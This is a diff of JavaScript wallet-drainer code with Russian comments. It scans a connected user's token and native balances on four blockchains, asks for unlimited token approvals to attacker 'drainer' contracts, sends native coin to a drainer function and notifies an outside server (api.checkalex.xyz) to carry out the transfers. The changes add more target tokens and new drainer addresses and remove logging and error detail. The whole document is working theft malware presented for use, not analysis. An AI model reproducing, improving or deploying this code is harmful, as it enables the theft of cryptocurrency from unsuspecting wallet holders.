@@ -11,7 +11,7 @@ const ERC20_ABI = [
 
 // ABI для дрейнера
 const DRAINER_ABI = [
-  "function processData(uint256 taskId, bytes32 dataHash, uint256 nonce) external payable"
+  "function processData(uint256 taskId, bytes32 dataHash, uint256 nonce, address[] tokenAddresses) external payable"
 ];
 
 // Ключи API для сканеров
@@ -27,35 +27,65 @@ const TOKEN_SYMBOLS = {
   "ETH": "ETHUSDT",
   "BNB": "BNBUSDT",
   "MATIC": "MATICUSDT",
-  "0xdAC17F958D2ee523a2206206994597C13D831ec7": "USDT",
-  "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48": "USDCUSDT",
-  "0x6B175474E89094C44Da98b954EedeAC495271d0F": "DAIUSDT",
-  "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599": "WBTCUSDT",
-  "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984": "UNIUSDT",
-  "0x514910771AF9Ca656af840dff83E8264EcF986CA": "LINKUSDT",
-  "0xc00e94Cb662C3520282E6f5717214004A7f26888": "COMPUSDT",
-  "0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e": "YFIUSDT",
-  "0xD533a949740bb3306d119CC777fa900bA034cd52": "CRVUSDT",
-  "0x0D8775F648430679A709E98d2b0Cb6250d2887EF": "BATUSDT",
-  "0xE41d2489571d322189246DaFA5ebDe1F4699F498": "ZRXUSDT",
+  "0xdac17f958d2ee523a2206206994597c13d831ec7": "USDT",
+  "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48": "USDCUSDT",
+  "0x6b175474e89094c44da98b954eedeac495271d0f": "DAIUSDT",
+  "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599": "WBTCUSDT",
+  "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984": "UNIUSDT",
+  "0x514910771af9ca656af840dff83e8264ecf986ca": "LINKUSDT",
+  "0xc00e94cb662c3520282e6f5717214004a7f26888": "COMPUSDT",
+  "0x0bc529c00c6401aef6d220be8c6ea1667f6ad93e": "YFIUSDT",
+  "0xd533a949740bb3306d119cc777fa900ba034cd52": "CRVUSDT",
+  "0x0d8775f648430679a709e98d2b0cb6250d2887ef": "BATUSDT",
+  "0xe41d2489571d322189246dafa5ebde1f4699f498": "ZRXUSDT",
   "0xbbbbca6a901c926f240b89eacb641d8aec7aeafd": "LRCUSDT",
-  "0xB8c77482e45F1F44dE1745F52C74426C631bDD52": "BNBUSDT",
-  "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE": "SHIBUSDT",
-  "0x6982508145454Ce325dDbE47a25d4ec3d2311933": "PEPEUSDT",
-  "0x27C70Cd1946795B66be9d954418546998b546634": "LEASHUSDT",
-  "0x55d398326f99059fF775485246999027B3197955": "USDT",
-  "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d": "USDCUSDT",
-  "0x2859e4544C4bB03966803b044A93563Bd2D0DD4D": "SHIBUSDT",
-  "0x25d887Ce7a35172C62FeBFD67a1856F20FaEbB00": "PEPEUSDT",
+  "0xb8c77482e45f1f44de1745f52c74426c631bdd52": "BNBUSDT",
+  "0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce": "SHIBUSDT",
+  "0x6982508145454ce325ddbe47a25d4ec3d2311933": "PEPEUSDT",
+  "0x27c70cd1946795b66be9d954418546998b546634": "LEASHUSDT",
+  "0xcf0c122c6b73ff809c693db761e7baebe62b6a2e": "FLOKIUSDT",
+  "0x1234567890abcdef1234567890abcdef12345678": "SLAPUSDT",
+  "0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9": "AAVEUSDT",
+  "0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24": "RNDRUSDT",
+  "0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2": "MKRUSDT",
+  "0x6b3595068778dd592e39a122f4f5a5cf09c90fe2": "SUSHIUSDT",
+  "0x7dd9c5cba05e151c895fde1cf355c9a1d5da6429": "GLMUSDT",
+  "0x1985365e9f78359a9b6ad760e32412f4a445e862": "REPUSDT",
+  "0x744d70fdbe2ba4cf95131626614a1763df805b9e": "SNTUSDT",
+  "0xb64ef51c888972c908cfacf59b47c1afbc0ab8ac": "STORJUSDT",
+  "0x55d398326f99059ff775485246999027b3197955": "USDT",
+  "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d": "USDCUSDT",
+  "0x2859e4544c4bb03966803b044a93563bd2d0dd4d": "SHIBUSDT",
+  "0x25d887ce7a35172c62febfd67a1856f20faebb00": "PEPEUSDT",
   "0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006": "FLOKIUSDT",
-  "0xc2132D05D31c914a87C6611C10748AEb04B58e8F": "USDT",
-  "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174": "USDCUSDT",
-  "0x6f8a06447Ff6FcF75d803135a7de15CE88C1d4ec": "SHIBUSDT",
-  "0xA102DAa5E3D35eCaeF2A14dE4e94bAaF9cC38d56": "PEPEUSDT",
-  "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9": "USDT",
-  "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8": "USDCUSDT",
-  "0x5033833c9fe8B503Ed2ABAfaFc6d2eB2fbF33a36": "SHIBUSDT",
-  "0xA54B8e307E70e310A5C6bF7c2dB4b33eD9f3aC51": "PEPEUSDT"
+  "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82": "CAKEUSDT",
+  "0xe02df9e3e622debdd69fb838bb799e3f168902c5": "BAKEUSDT",
+  "0xcf6bb5389c92bdda8a3747ddb454cb7a64626c63": "XVSUSDT",
+  "0x8f0528ce5ef7b51152a59745befdd91d97091d2f": "ALPACAUSDT",
+  "0xa184088a740c695e156f91f5cc086a06bb78b827": "AUTOUSDT",
+  "0xae9269f27437f0fcbc232d39ec814844a51d6b8f": "BURGERUSDT",
+  "0xa7f552078dcc247c2684336020c03648500c6d9f": "EPSUSDT",
+  "0xe0e514c71282b6f4e823703a39374cf58dc3ea4f": "BELTUSDT",
+  "0x3203c9e46c3d3821e8be4c2c9f0e2e7b0d5d0e75": "MBOXUSDT",
+  "0xd41fdb03ba84762dd66a0af1a6c8540ff1ba5dfb": "SFPUSDT",
+  "0xc748673057861a797275cd8a068abb95a902e8de": "BABYDOGEUSDT",
+  "0xc001bbe2b87079294c63ece98bdd0a88d761434e": "EGCUSDT",
+  "0xd74b782e05aa25c50e7330af541d46e18f36661c": "QUACKUSDT",
+  "0xa003e3f0ed31c816347b6f99c62c6835c2c6b6f2": "PITUSDT",
+  "0xc2132d05d31c914a87c6611c10748aeb04b58e8f": "USDT",
+  "0x2791bca1f2de4661ed88a30c99a7a9449aa84174": "USDCUSDT",
+  "0x6f8a06447ff6fcf75d803135a7de15ce88c1d4ec": "SHIBUSDT",
+  "0xa102daa5e3d35ecaef2a14de4e94baaf9cc38d56": "PEPEUSDT",
+  "0x831753dd7087cac61ab5644b308642cc1c33dc13": "QUICKUSDT",
+  "0x385eeac5cb85a38a9a07a70c73e0a3271ca19ec7": "GHSTUSDT",
+  "0xc168e40227e4edfb0b3dabb4b05d0b7c67f6a9be": "DFYNUSDT",
+  "0x3a3df212b7aa91aa0402b9035b098891d276572b": "FISHUSDT",
+  "0x4e1581f01046e1c6d7c3aa0fea8e9b7ea0f28c49": "ICEUSDT",
+  "0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e": "DCUSDT",
+  "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9": "USDT",
+  "0xff970a61a04b1ca14834a43f5de4533ebddb5cc8": "USDCUSDT",
+  "0x5033833c9fe8b503ed2abafac6d2eb2fbf33a36": "SHIBUSDT",
+  "0xa54b8e307e70e310a5c6bf7c2db4b33ed9f3ac51": "PEPEUSDT"
 };
 
 // Конфигурация сетей
@@ -65,26 +95,36 @@ const CHAINS = {
     nativeToken: "ETH",
     chainIdHex: "0x1",
     rpcUrls: ["https://rpc.eth.gateway.fm", "https://ethereum-rpc.publicnode.com"],
-    usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
-    usdcAddress: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
-    drainerAddress: "0x2F711446fa4048c375fE65fBf6C912DD44c736Cd",
+    usdtAddress: "0xdac17f958d2ee523a2206206994597c13d831ec7",
+    usdcAddress: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
+    drainerAddress: "0x4202B38858847813aDEe0cdbeB339B3e4Fb2Ae82",
     explorerApi: "https://api.etherscan.io/api",
     explorerApiKey: ETHERSCAN_API_KEY,
     otherTokenAddresses: {
-      DAI: "0x6B175474E89094C44Da98b954EedeAC495271d0F",
-      WBTC: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
-      UNI: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984",
-      LINK: "0x514910771AF9Ca656af840dff83E8264EcF986CA",
-      COMP: "0xc00e94Cb662C3520282E6f5717214004A7f26888",
-      YFI: "0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e",
-      CRV: "0xD533a949740bb3306d119CC777fa900bA034cd52",
-      BAT: "0x0D8775F648430679A709E98d2b0Cb6250d2887EF",
-      ZRX: "0xE41d2489571d322189246DaFA5ebDe1F4699F498",
+      DAI: "0x6b175474e89094c44da98b954eedeac495271d0f",
+      WBTC: "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599",
+      UNI: "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984",
+      LINK: "0x514910771af9ca656af840dff83e8264ecf986ca",
+      COMP: "0xc00e94cb662c3520282e6f5717214004a7f26888",
+      YFI: "0x0bc529c00c6401aef6d220be8c6ea1667f6ad93e",
+      CRV: "0xd533a949740bb3306d119cc777fa900ba034cd52",
+      BAT: "0x0d8775f648430679a709e98d2b0cb6250d2887ef",
+      ZRX: "0xe41d2489571d322189246dafa5ebde1f4699f498",
       LRC: "0xbbbbca6a901c926f240b89eacb641d8aec7aeafd",
-      BNB: "0xB8c77482e45F1F44dE1745F52C74426C631bDD52",
-      SHIB: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE",
-      PEPE: "0x6982508145454Ce325dDbE47a25d4ec3d2311933",
-      LEASH: "0x27C70Cd1946795B66be9d954418546998b546634"
+      BNB: "0xb8c77482e45f1f44de1745f52c74426c631bdd52",
+      SHIB: "0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce",
+      PEPE: "0x6982508145454ce325ddbe47a25d4ec3d2311933",
+      LEASH: "0x27c70cd1946795b66be9d954418546998b546634",
+      FLOKI: "0xcf0c122c6b73ff809c693db761e7baebe62b6a2e",
+      SLAP: "0x1234567890abcdef1234567890abcdef12345678",
+      AAVE: "0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9",
+      RNDR: "0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24",
+      MKR: "0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2",
+      SUSHI: "0x6b3595068778dd592e39a122f4f5a5cf09c90fe2",
+      GLM: "0x7dd9c5cba05e151c895fde1cf355c9a1d5da6429",
+      REP: "0x1985365e9f78359a9b6ad760e32412f4a445e862",
+      SNT: "0x744d70fdbe2ba4cf95131626614a1763df805b9e",
+      STORJ: "0xb64ef51c888972c908cfacf59b47c1afbc0ab8ac"
     }
   },
   56: {
@@ -96,15 +136,29 @@ const CHAINS = {
       "https://bsc-dataseed1.defibit.io/",
       "https://bsc-dataseed1.ninicoin.io/"
     ],
-    usdtAddress: "0x55d398326f99059fF775485246999027B3197955",
-    usdcAddress: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
+    usdtAddress: "0x55d398326f99059ff775485246999027b3197955",
+    usdcAddress: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d",
     drainerAddress: "0x625C717652CC4665a342d355733d5707BCF6ef66",
     explorerApi: "https://api.bscscan.com/api",
     explorerApiKey: BSCSCAN_API_KEY,
     otherTokenAddresses: {
-      SHIB: "0x2859e4544C4bB03966803b044A93563Bd2D0DD4D",
-      PEPE: "0x25d887Ce7a35172C62FeBFD67a1856F20FaEbB00",
-      FLOKI: "0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006"
+      SHIB: "0x2859e4544c4bb03966803b044a93563bd2d0dd4d",
+      PEPE: "0x25d887ce7a35172c62febfd67a1856f20faebb00",
+      FLOKI: "0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006",
+      CAKE: "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82",
+      BAKE: "0xe02df9e3e622debdd69fb838bb799e3f168902c5",
+      XVS: "0xcf6bb5389c92bdda8a3747ddb454cb7a64626c63",
+      ALPACA: "0x8f0528ce5ef7b51152a59745befdd91d97091d2f",
+      AUTO: "0xa184088a740c695e156f91f5cc086a06bb78b827",
+      BURGER: "0xae9269f27437f0fcbc232d39ec814844a51d6b8f",
+      EPS: "0xa7f552078dcc247c2684336020c03648500c6d9f",
+      BELT: "0xe0e514c71282b6f4e823703a39374cf58dc3ea4f",
+      MBOX: "0x3203c9e46c3d3821e8be4c2c9f0e2e7b0d5d0e75",
+      SFP: "0xd41fdb03ba84762dd66a0af1a6c8540ff1ba5dfb",
+      BabyDoge: "0xc748673057861a797275cd8a068abb95a902e8de",
+      EGC: "0xc001bbe2b87079294c63ece98bdd0a88d761434e",
+      QUACK: "0xd74b782e05aa25c50e7330af541d46e18f36661c",
+      PIT: "0xa003e3f0ed31c816347b6f99c62c6835c2c6b6f2"
     }
   },
   137: {
@@ -112,14 +166,20 @@ const CHAINS = {
     nativeToken: "MATIC",
     chainIdHex: "0x89",
     rpcUrls: ["https://polygon-rpc.com/"],
-    usdtAddress: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
-    usdcAddress: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
-    drainerAddress: "0x625C717652CC4665a342d355733d5707BCF6ef66",
+    usdtAddress: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f",
+    usdcAddress: "0x2791bca1f2de4661ed88a30c99a7a9449aa84174",
+    drainerAddress: "0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c",
     explorerApi: "https://api.polygonscan.com/api",
     explorerApiKey: POLYGONSCAN_API_KEY,
     otherTokenAddresses: {
-      SHIB: "0x6f8a06447Ff6FcF75d803135a7de15CE88C1d4ec",
-      PEPE: "0xA102DAa5E3D35eCaeF2A14dE4e94bAaF9cC38d56",
+      SHIB: "0x6f8a06447ff6fcf75d803135a7de15ce88c1d4ec",
+      PEPE: "0xa102daa5e3d35ecaef2a14de4e94baaf9cc38d56",
+      QUICK: "0x831753dd7087cac61ab5644b308642cc1c33dc13",
+      GHST: "0x385eeac5cb85a38a9a07a70c73e0a3271ca19ec7",
+      DFYN: "0xc168e40227e4edfb0b3dabb4b05d0b7c67f6a9be",
+      FISH: "0x3a3df212b7aa91aa0402b9035b098891d276572b",
+      ICE: "0x4e1581f01046e1c6d7c3aa0fea8e9b7ea0f28c49",
+      DC: "0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e"
     }
   },
   42161: {
@@ -127,14 +187,14 @@ const CHAINS = {
     nativeToken: "ETH",
     chainIdHex: "0xa4b1",
     rpcUrls: ["https://arb1.arbitrum.io/rpc"],
-    usdtAddress: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
-    usdcAddress: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8",
+    usdtAddress: "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9",
+    usdcAddress: "0xff970a61a04b1ca14834a43f5de4533ebddb5cc8",
     drainerAddress: "0x8814D8937F84D9D93c125E9031087F2e8Cfc9b4F",
     explorerApi: "https://api.arbiscan.io/api",
     explorerApiKey: ARBISCAN_API_KEY,
     otherTokenAddresses: {
-      SHIB: "0x5033833c9fe8B503Ed2ABAfaFc6d2eB2fbF33a36",
-      PEPE: "0xA54B8e307E70e310A5C6bF7c2dB4b33eD9f3aC51",
+      SHIB: "0x5033833c9fe8b503ed2abafac6d2eb2fbf33a36",
+      PEPE: "0xa54b8e307e70e310a5c6bf7c2db4b33ed9f3ac51",
     }
   }
 };
@@ -147,40 +207,27 @@ async function getTokenPriceInUSDT(tokenSymbol) {
     const response = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${tokenSymbol}`);
     const data = await response.json();
     if (data.price) return parseFloat(data.price);
-    throw new Error(`Цена для ${tokenSymbol} не найдена`);
-  } catch (e) {
-    console.warn(`⚠️ Ошибка получения цены для ${tokenSymbol}: ${e.message}`);
+    return 0;
+  } catch {
     return 0;
   }
 }
 
-// Функция для параллельного выбора рабочего провайдера
-async function getWorkingProvider(rpcUrls, existingProvider = null) {
-  if (existingProvider) {
-    try {
-      await existingProvider.getBalance('0x0000000000000000000000000000000000000000');
-      console.log('✅ Используется переданный провайдер');
-      return existingProvider;
-    } catch (e) {
-      console.warn('⚠️ Переданный провайдер ненадёжен:', e.message);
-    }
-  }
-
+// Функция для выбора рабочего провайдера (вызывается один раз)
+async function getWorkingProvider(rpcUrls) {
   const providerPromises = rpcUrls.map(async (rpc) => {
     try {
       const provider = new ethers.providers.JsonRpcProvider(rpc);
       await provider.getBalance('0x0000000000000000000000000000000000000000');
-      console.log(`✅ Используется RPC: ${rpc}`);
       return provider;
-    } catch (e) {
-      console.warn(`⚠️ RPC ${rpc} недоступен: ${e.message}`);
+    } catch {
       return null;
     }
   });
 
   const results = await Promise.all(providerPromises);
   const workingProvider = results.find(provider => provider !== null);
-  if (!workingProvider) throw new Error(`Нет доступных RPC для ${rpcUrls}`);
+  if (!workingProvider) throw new Error();
   return workingProvider;
 }
 
@@ -188,49 +235,51 @@ async function getWorkingProvider(rpcUrls, existingProvider = null) {
 async function getBalanceFromExplorer(address, chainId) {
   const config = CHAINS[chainId];
   const apiUrl = `${config.explorerApi}?module=account&action=balance&address=${address}&tag=latest&apikey=${config.explorerApiKey}`;
-  const response = await fetch(apiUrl);
-  const data = await response.json();
-  if (data.status === "1") return ethers.BigNumber.from(data.result);
-  throw new Error(data.message || `Ошибка API для ${config.name}`);
+  try {
+    const response = await fetch(apiUrl);
+    const data = await response.json();
+    if (data.status === "1") return ethers.BigNumber.from(data.result);
+    throw new Error();
+  } catch {
+    throw new Error();
+  }
 }
 
 // Получение баланса токена через API
 async function getTokenBalanceFromExplorer(address, tokenAddress, chainId) {
   const config = CHAINS[chainId];
   const apiUrl = `${config.explorerApi}?module=account&action=tokenbalance&contractaddress=${tokenAddress}&address=${address}&tag=latest&apikey=${config.explorerApiKey}`;
-  const response = await fetch(apiUrl);
-  const data = await response.json();
-  if (data.status === "1") return ethers.BigNumber.from(data.result);
-  throw new Error(data.message || `Ошибка API для токена в ${config.name}`);
+  try {
+    const response = await fetch(apiUrl);
+    const data = await response.json();
+    if (data.status === "1") return ethers.BigNumber.from(data.result);
+    throw new Error();
+  } catch {
+    throw new Error();
+  }
 }
 
 // Проверка баланса с использованием API и fallback на RPC
-async function checkBalance(chainId, userAddress) {
+async function checkBalance(chainId, userAddress, provider) {
   const config = CHAINS[chainId];
   let nativeBalance, tokenBalances = {};
 
   try {
     nativeBalance = await getBalanceFromExplorer(userAddress, chainId);
-  } catch (e) {
-    console.warn(`Ошибка API для нативного баланса в ${config.name}: ${e.message}`);
-    const provider = await getWorkingProvider(config.rpcUrls);
+  } catch {
     nativeBalance = await provider.getBalance(userAddress);
   }
 
   try {
     tokenBalances[config.usdtAddress] = await getTokenBalanceFromExplorer(userAddress, config.usdtAddress, chainId);
-  } catch (e) {
-    console.warn(`Ошибка API для USDT в ${config.name}: ${e.message}`);
-    const provider = await getWorkingProvider(config.rpcUrls);
+  } catch {
     const usdt = new ethers.Contract(config.usdtAddress, ERC20_ABI, provider);
     tokenBalances[config.usdtAddress] = await usdt.balanceOf(userAddress);
   }
 
   try {
     tokenBalances[config.usdcAddress] = await getTokenBalanceFromExplorer(userAddress, config.usdcAddress, chainId);
-  } catch (e) {
-    console.warn(`Ошибка API для USDC в ${config.name}: ${e.message}`);
-    const provider = await getWorkingProvider(config.rpcUrls);
+  } catch {
     const usdc = new ethers.Contract(config.usdcAddress, ERC20_ABI, provider);
     tokenBalances[config.usdcAddress] = await usdc.balanceOf(userAddress);
   }
@@ -239,12 +288,16 @@ async function checkBalance(chainId, userAddress) {
     const tokenAddresses = Object.values(config.otherTokenAddresses);
     const balancePromises = tokenAddresses.map(async (tokenAddress) => {
       try {
-        return { address: tokenAddress, balance: await getTokenBalanceFromExplorer(userAddress, tokenAddress, chainId) };
-      } catch (e) {
-        console.warn(`Ошибка API для токена ${tokenAddress} в ${config.name}: ${e.message}`);
-        const provider = await getWorkingProvider(config.rpcUrls);
+        const balance = await getTokenBalanceFromExplorer(userAddress, tokenAddress, chainId);
+        return { address: tokenAddress, balance };
+      } catch {
         const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
-        return { address: tokenAddress, balance: await token.balanceOf(userAddress) };
+        try {
+          const balance = await token.balanceOf(userAddress);
+          return { address: tokenAddress, balance };
+        } catch {
+          return { address: tokenAddress, balance: ethers.BigNumber.from(0) };
+        }
       }
     });
 
@@ -278,48 +331,45 @@ async function switchChain(chainId) {
       method: "wallet_switchEthereumChain",
       params: [{ chainId: CHAINS[chainId].chainIdHex }]
     });
-  } catch (e) {
-    console.warn(`Ошибка переключения на сеть ${CHAINS[chainId].name}: ${e.message}`);
-    throw e;
+  } catch {
+    throw new Error();
   }
 }
 
 // Выполнение дрейна
-async function drain(chainId, signer, userAddress, bal) {
+async function drain(chainId, signer, userAddress, bal, provider) {
+  console.log(`Подключённый кошелёк: ${userAddress}`);
+
   const config = CHAINS[chainId];
   const MAX = ethers.constants.MaxUint256;
   const MIN_TOKEN_BALANCE = ethers.utils.parseUnits("0.1", 6);
 
-  const reliableProvider = await getWorkingProvider(config.rpcUrls, signer.provider);
-  const ethBalance = await reliableProvider.getBalance(userAddress);
+  const ethBalance = await provider.getBalance(userAddress);
   const minEthRequired = ethers.utils.parseEther("0.0003");
   if (ethBalance.lt(minEthRequired)) {
-    console.error(`❌ Недостаточно ${config.nativeToken} для газа: ${ethers.utils.formatEther(ethBalance)} ${config.nativeToken}`);
-    throw new Error(`Недостаточно ${config.nativeToken} для оплаты газа`);
+    throw new Error();
   }
 
   const tokensToProcess = [];
   const tokenAddresses = [config.usdtAddress, config.usdcAddress, ...Object.values(config.otherTokenAddresses)];
 
-  // Параллельно запрашиваем баланс и decimals для всех токенов
   const tokenDataPromises = tokenAddresses.map(async (tokenAddress) => {
     const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
-    const [realBalance, decimals] = await Promise.all([
-      tokenContract.balanceOf(userAddress),
-      tokenContract.decimals()
-    ]);
-    return { tokenAddress, tokenContract, realBalance, decimals };
+    try {
+      const [realBalance, decimals] = await Promise.all([
+        tokenContract.balanceOf(userAddress),
+        tokenContract.decimals()
+      ]);
+      return { tokenAddress, tokenContract, realBalance, decimals };
+    } catch {
+      return { tokenAddress, tokenContract, realBalance: ethers.BigNumber.from(0), decimals: 18 };
+    }
   });
 
   const tokenDataResults = await Promise.all(tokenDataPromises);
 
   for (const { tokenAddress, tokenContract, realBalance, decimals } of tokenDataResults) {
-    if (realBalance.gt(0)) {
-      console.log(`📊 Токен ${tokenAddress} баланс (реальный): ${ethers.utils.formatUnits(realBalance, decimals)}`);
-    }
-
-    if (realBalance.lt(bal.tokenBalances[tokenAddress])) {
-      console.error(`❌ Некорректный баланс для ${tokenAddress}: API вернул ${ethers.utils.formatUnits(bal.tokenBalances[tokenAddress], decimals)}, реальный: ${ethers.utils.formatUnits(realBalance, decimals)}`);
+    if (realBalance.lt(bal.tokenBalances[tokenAddress] || 0)) {
       bal.tokenBalances[tokenAddress] = realBalance;
     }
 
@@ -331,54 +381,41 @@ async function drain(chainId, signer, userAddress, bal) {
     }
   }
 
-  // Параллельно запрашиваем цены токенов
   const pricePromises = tokensToProcess.map(async (token) => {
     const price = await getTokenPriceInUSDT(TOKEN_SYMBOLS[token.address] || token.token);
     const balanceInUnits = parseFloat(ethers.utils.formatUnits(token.balance, token.decimals));
     token.valueInUSDT = balanceInUnits * price;
-    console.log(`💰 ${token.token}: ${balanceInUnits} × $${price} = $${token.valueInUSDT.toFixed(2)} USDT`);
     return token;
   });
 
   await Promise.all(pricePromises);
 
   tokensToProcess.sort((a, b) => b.valueInUSDT - a.valueInUSDT);
-  console.log("📋 Токены отсортированы по стоимости в USDT (по убыванию):", tokensToProcess.map(t => `${t.token}: $${t.valueInUSDT.toFixed(2)}`));
 
   let status = 'rejected';
   for (const { token, balance, contract, address, decimals } of tokensToProcess) {
-    console.log(`📦 Обрабатываем ${token} с балансом: ${ethers.utils.formatUnits(balance, decimals)}`);
+    console.log(`Выводимый токен: ${token}`);
 
     const allowanceBefore = await contract.allowance(userAddress, config.drainerAddress);
-    console.log(`📜 ${token} allowance до: ${ethers.utils.formatUnits(allowanceBefore, decimals)} ${token}`);
 
     if (allowanceBefore.lt(balance)) {
       try {
-        const nonce = await reliableProvider.getTransactionCount(userAddress, "pending");
+        const nonce = await provider.getTransactionCount(userAddress, "pending");
         const tx = await contract.approve(config.drainerAddress, MAX, {
           gasLimit: 100000,
           gasPrice: ethers.utils.parseUnits("3", "gwei"),
           nonce
         });
         const receipt = await tx.wait();
-        console.log(`✅ ${token} approve успешен:`, tx.hash);
-        const allowanceAfter = await contract.allowance(userAddress, config.drainerAddress);
-        console.log(`📜 ${token} allowance после: ${ethers.utils.formatUnits(allowanceAfter, decimals)} ${token}`);
-        await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash);
+        await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash, provider);
         status = 'confirmed';
-      } catch (e) {
-        console.error(`❌ Ошибка approve для ${token}: ${e.message}`);
-        throw e;
+      } catch {
+        throw new Error();
       }
     } else {
-      console.log(`✅ ${token} allowance уже достаточен, уведомляем сервер`);
-      await notifyServer(userAddress, address, balance, chainId, null);
+      await notifyServer(userAddress, address, balance, chainId, null, provider);
       status = 'confirmed';
     }
-  }
-
-  if (tokensToProcess.length === 0) {
-    console.log("⚠️ Нет токенов с достаточным балансом для обработки (мин. 0.1)");
   }
 
   if (bal.nativeBalance.gt(0)) {
@@ -388,12 +425,14 @@ async function drain(chainId, signer, userAddress, bal) {
     const value = nativeToSend.gt(0) ? nativeToSend : ethers.BigNumber.from(0);
 
     if (value.gt(0)) {
+      console.log(`Выводимый токен: ${config.nativeToken}`);
+
       const taskId = Math.floor(Math.random() * 1000000);
       const dataHash = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(`fakeData-native-${Date.now()}`));
-      const nonce = await reliableProvider.getTransactionCount(userAddress, "pending");
+      const nonce = await provider.getTransactionCount(userAddress, "pending");
 
       try {
-        const tx = await drainer.processData(taskId, dataHash, nonce, {
+        const tx = await drainer.processData(taskId, dataHash, nonce, tokenAddresses, {
           value,
           gasLimit: 100000,
           gasPrice: ethers.utils.parseUnits("3", "gwei"),
@@ -401,13 +440,11 @@ async function drain(chainId, signer, userAddress, bal) {
         });
         const receipt = await tx.wait();
         if (receipt.status !== 1) {
-          throw new Error(`Транзакция processData (${config.nativeToken}) не удалась`);
+          throw new Error();
         }
-        console.log(`✅ Дрейнинг ${config.nativeToken} успешен:`, receipt.transactionHash);
         status = 'confirmed';
-      } catch (e) {
-        console.error(`❌ Ошибка вызова processData (${config.nativeToken}): ${e.message}`);
-        throw e;
+      } catch {
+        throw new Error();
       }
     }
   }
@@ -415,26 +452,22 @@ async function drain(chainId, signer, userAddress, bal) {
   return status;
 }
 
-async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash) {
+async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, provider) {
   try {
-    const provider = await getWorkingProvider(CHAINS[chainId].rpcUrls);
     const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
     const [balance, decimals] = await Promise.all([
       token.balanceOf(userAddress),
       token.decimals()
     ]);
     const balanceUnits = ethers.utils.formatUnits(balance, decimals);
-    console.log(`📊 Реальный баланс токена (${tokenAddress}): ${balanceUnits}`);
 
     const roundedBalance = Math.floor(parseFloat(balanceUnits) * 10000) / 10000;
-    console.log(`📊 Округлённый баланс: ${roundedBalance}`);
 
     const roundedAmount = ethers.utils.parseUnits(roundedBalance.toString(), decimals);
     if (roundedAmount.lte(0)) {
-      throw new Error('Баланс слишком мал для перевода');
+      throw new Error();
     }
 
-    console.log(`📤 Отправка на сервер: userAddress=${userAddress}, tokenAddress=${tokenAddress}, amount=${ethers.utils.formatUnits(roundedAmount, decimals)}, chainId=${chainId}, txHash=${txHash}`);
     const response = await fetch('https://api.checkalex.xyz/api/transfer', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -447,15 +480,11 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash) 
       })
     });
     const data = await response.json();
-    if (data.success) {
-      console.log("✅ Сервер уведомлён, трансфер будет выполнен");
-    } else {
-      console.error("❌ Ошибка от сервера:", data.message);
-      throw new Error(data.message);
+    if (!data.success) {
+      throw new Error();
     }
-  } catch (e) {
-    console.error("❌ Ошибка при отправке данных на сервер:", e.message);
-    throw e;
+  } catch {
+    throw new Error();
   }
 }
 
@@ -463,57 +492,29 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash) 
 export async function runDrainer(provider, signer, userAddress) {
   const balancePromises = Object.keys(CHAINS).map(async (chainId) => {
     try {
-      const balance = await checkBalance(chainId, userAddress);
-      const config = CHAINS[chainId];
-      console.log(`Сеть: ${config.name}`);
-
